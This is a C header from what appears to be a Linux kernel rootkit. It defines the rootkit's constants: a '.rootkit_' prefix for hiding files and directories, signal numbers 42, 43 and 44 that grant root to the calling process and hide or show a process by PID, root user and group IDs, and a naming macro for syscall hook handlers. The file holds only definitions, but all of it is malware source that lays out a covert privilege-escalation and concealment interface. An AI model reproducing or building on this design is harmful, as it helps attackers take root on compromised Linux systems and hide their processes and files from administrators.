#ifndef _ROOTKIT_CONSTANTS_H_
#define _ROOTKIT_CONSTANTS_H_

#include <linux/types.h>
#include <vdso/limits.h>

#define HIDDEN_PREFIX ".rootkit_"                        /* Prefix for hidden files/directories */
#define HIDDEN_PREFIX_LEN (sizeof(HIDDEN_PREFIX) - 1) /* Length of the prefix */
extern const char S_HIDDEN_PREFIX[];                     // Prefix for hidden files/directories

#define SIGROOT 42 /* Elevate the current process to root */
#define SIGHIDE 43 /* Hide the process with the given PID */
#define SIGSHOW 44 /* Show the process with the given PID */

#define PID_ANY INT_MIN /* Any PID */
#define SIG_ANY INT_MIN /* Any signal */

#define ROOT_UID (uid_t)0 /* The root user ID */
#define ROOT_GID (gid_t)0 /* The root group ID */

/**
 * Defines how to name a syscall hook handler function.
 * The function name is `_new_<syscall_name>_handler`.
 *
 * @param _syscall_name The syscall name
 * @return The hook handler function name
 */
#define HOOK_HANDLER_NAME(_syscall_name) _new_##_syscall_name##_handler

#endif
